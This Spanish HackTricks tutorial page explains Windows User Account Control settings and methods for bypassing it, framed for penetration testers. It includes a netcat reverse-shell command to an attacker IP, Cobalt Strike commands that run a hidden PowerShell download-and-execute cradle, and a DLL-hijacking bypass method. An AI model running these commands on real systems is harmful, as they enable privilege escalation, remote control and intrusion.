# UAC - Control de Cuentas de Usuario

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente, potenciados por las herramientas comunitarias **más avanzadas**.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Control de Cuentas de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que permite una **solicitud de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integridad`, y un programa con un nivel **alto** puede realizar tareas que **podrían comprometer el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre se **ejecutan bajo el contexto de seguridad de una cuenta de no administrador** a menos que un administrador autorice explícitamente a estas aplicaciones/tareas a tener acceso de nivel administrador al sistema para ejecutarse. Es una característica de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera un límite de seguridad.

Para más información sobre los niveles de integridad:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Cuando UAC está en su lugar, a un usuario administrador se le dan 2 tokens: una llave de usuario estándar, para realizar acciones regulares a nivel regular, y otra con los privilegios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute cómo funciona UAC en gran profundidad e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específicamente para su organización a nivel local (usando secpol.msc), o configurado y desplegado a través de Objetos de Política de Grupo (GPO) en un entorno de dominio de Active Directory. Los diversos ajustes se discuten en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Política de Grupo que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:

| Configuración de Política de Grupo                                                                                                                                                                                                                                                                                                                                                           | Clave de Registro                | Configuración Predeterminada                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Control de Cuentas de Usuario: Modo de Aprobación de Administrador para la cuenta de administrador integrada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deshabilitado                                                     |
| [Control de Cuentas de Usuario: Permitir que aplicaciones UIAccess soliciten elevación sin usar el escritorio seguro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deshabilitado                                                     |
| [Control de Cuentas de Usuario: Comportamiento del aviso de elevación para administradores en Modo de Aprobación de Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimiento para binarios no Windows                  |
| [Control de Cuentas de Usuario: Comportamiento del aviso de elevación para usuarios estándar](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciales en el escritorio seguro                 |
| [Control de Cuentas de Usuario: Detectar instalaciones de aplicaciones y solicitar elevación](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (predeterminado para casa) Deshabilitado (predeterminado para empresas) |
| [Control de Cuentas de Usuario: Solo elevar ejecutables que estén firmados y validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deshabilitado                                                     |
| [Control de Cuentas de Usuario: Solo elevar aplicaciones UIAccess que estén instaladas en ubicaciones seguras](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                      |
| [Control de Cuentas de Usuario: Ejecutar todos los administradores en Modo de Aprobación de Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                      |
| [Control de Cuentas de Usuario: Cambiar al escritorio seguro al solicitar elevación](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                      |
| [Control de Cuentas de Usuario: Virtualizar fallos de escritura de archivos y registro en ubicaciones por usuario](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                      |

### Teoría de Evasión de UAC

Algunos programas son **autoelevados automáticamente** si el **usuario pertenece** al **grupo de administradores**. Estos binarios tienen dentro de sus _**Manifiestos**_ la opción _**autoElevate**_ con valor _**True**_. El binario también tiene que estar **firmado por Microsoft**.

Entonces, para **evadir** el **UAC** (elevar desde el nivel de integridad **medio** **a alto**) algunos atacantes usan este tipo de binarios para **ejecutar código arbitrario** porque se ejecutará desde un proceso de **integridad de nivel Alto**.

Puedes **verificar** el _**Manifiesto**_ de un binario usando la herramienta _**sigcheck.exe**_ de Sysinternals. Y puedes **ver** el **nivel de integridad** de los procesos usando _Process Explorer_ o _Process Monitor_ (de Sysinternals).

### Verificar UAC

Para confirmar si UAC está habilitado haz:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si es **`1`**, entonces UAC está **activado**, si es **`0`** o **no existe**, entonces UAC está **inactivo**.

Luego, verifica **qué nivel** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Si **`0`**, entonces, UAC no mostrará advertencias (como si estuviera **deshabilitado**)
* Si **`1`**, se **pedirá al administrador nombre de usuario y contraseña** para ejecutar el binario con altos privilegios (en Escritorio Seguro)
* Si **`2`** (**Siempre notificarme**), UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con altos privilegios (en Escritorio Seguro)
* Si **`3`**, como `1` pero no es necesario en Escritorio Seguro
* Si **`4`**, como `2` pero no es necesario en Escritorio Seguro
* Si **`5`**(**predeterminado**), pedirá al administrador confirmar para ejecutar binarios no de Windows con altos privilegios

Luego, debes mirar el valor de **`LocalAccountTokenFilterPolicy`**\
Si el valor es **`0`**, entonces, solo el usuario **RID 500** (**Administrador integrado**) puede realizar **tareas de administrador sin UAC**, y si es `1`, **todas las cuentas dentro del grupo "Administradores"** pueden hacerlas.

Y, finalmente, echa un vistazo al valor de la clave **`FilterAdministratorToken`**\
Si **`0`**(predeterminado), la **cuenta de Administrador integrado puede** realizar tareas de administración remota y si **`1`**, la cuenta de Administrador integrado **no puede** realizar tareas de administración remota, a menos que `LocalAccountTokenFilterPolicy` esté configurado en `1`.

#### Resumen

* Si `EnableLUA=0` o **no existe**, **ningún UAC para nadie**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=1`, Ningún UAC para nadie**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=0`, Ningún UAC para RID 500 (Administrador Integrado)**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=1`, UAC para todos**

Toda esta información se puede recopilar utilizando el módulo de **metasploit**: `post/windows/gather/win_privs`

También puedes verificar los grupos de tu usuario y obtener el nivel de integridad:
```
net user %username%
whoami /groups | findstr Level
```
## Elusión de UAC

{% hint style="info" %}
Ten en cuenta que si tienes acceso gráfico a la víctima, la elusión de UAC es directa ya que puedes simplemente hacer clic en "Sí" cuando aparezca el aviso de UAS.
{% endhint %}

La elusión de UAC es necesaria en la siguiente situación: **el UAC está activado, tu proceso se está ejecutando en un contexto de integridad media y tu usuario pertenece al grupo de administradores**.

Es importante mencionar que es **mucho más difícil eludir el UAC si está en el nivel de seguridad más alto (Siempre) que si está en cualquiera de los otros niveles (Predeterminado).**

### UAC desactivado

Si el UAC ya está desactivado (`ConsentPromptBehaviorAdmin` es **`0`**), puedes **ejecutar una shell inversa con privilegios de administrador** (nivel de integridad alto) utilizando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass con duplicación de token

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** Básico "bypass" de UAC (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que está dentro del grupo de Administradores, puedes **montar el C$** compartido vía SMB (sistema de archivos) local en un nuevo disco y tendrás **acceso a todo dentro del sistema de archivos** (incluso la carpeta del hogar del Administrador).

{% hint style="warning" %}
**Parece que este truco ya no funciona**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Elusión de UAC con Cobalt Strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **bypass** el **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass de UAC

[**UACME**](https://github.com/hfiref0x/UACME) que es una **compilación** de varios exploits de bypass de UAC. Ten en cuenta que necesitarás **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitarás saber **cuál necesitas.**\
Debes **tener cuidado** porque algunos bypasses **provocarán que se abran otros programas** que **alertarán** al **usuario** de que algo está sucediendo.

UACME tiene la **versión de compilación desde la cual cada técnica comenzó a funcionar**. Puedes buscar una técnica que afecte a tus versiones:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
También, utilizando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página puedes obtener la versión de Windows `1607` a partir de las versiones de compilación.

#### Más métodos para eludir UAC

**Todas** las técnicas utilizadas aquí para eludir UAC **requieren** una **shell interactiva completa** con la víctima (una shell común de nc.exe no es suficiente).

Puedes obtenerla usando una sesión de **meterpreter**. Migra a un **proceso** que tenga el valor de **Session** igual a **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ debería funcionar)

### Eludir UAC con GUI

Si tienes acceso a una **GUI puedes simplemente aceptar el aviso de UAC** cuando aparezca, realmente no necesitas eludirlo. Por lo tanto, tener acceso a una GUI te permitirá eludir UAC.

Además, si obtienes una sesión GUI que alguien estaba utilizando (potencialmente a través de RDP), hay **algunas herramientas que se ejecutarán como administrador** desde donde podrías **ejecutar** un **cmd** por ejemplo **como administrador** directamente sin que UAC te lo solicite nuevamente como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **sigiloso**.

### Eludir UAC con fuerza bruta ruidosa

Si no te importa ser ruidoso siempre podrías **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **solicita elevar permisos hasta que el usuario lo acepte**.

### Tu propio método de elusión - Metodología básica para eludir UAC

Si observas **UACME** notarás que **la mayoría de las elusiones de UAC abusan de una vulnerabilidad de Secuestro de DLL** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Secuestro de DLL](../windows-local-privilege-escalation/dll-hijacking.md).

1. Encuentra un binario que se **autoeleve** (comprueba que cuando se ejecuta, se ejecute en un nivel de integridad alto).
2. Con procmon busca eventos de "**NAME NOT FOUND**" que puedan ser vulnerables a **Secuestro de DLL**.
3. Probablemente necesitarás **escribir** la DLL dentro de algunos **caminos protegidos** (como C:\Windows\System32) donde no tienes permisos de escritura. Puedes eludir esto utilizando:
   1. **wusa.exe**: Windows 7,8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de caminos protegidos (porque esta herramienta se ejecuta desde un nivel de integridad alto).
   2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro del camino protegido y ejecutar el binario vulnerable y autoelevado.

### Otra técnica para eludir UAC

Consiste en observar si un **binario autoElevado** intenta **leer** del **registro** el **nombre/ruta** de un **binario** o **comando** a ser **ejecutado** (esto es más interesante si el binario busca esta información dentro del **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente, potenciados por las herramientas comunitarias **más avanzadas**.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
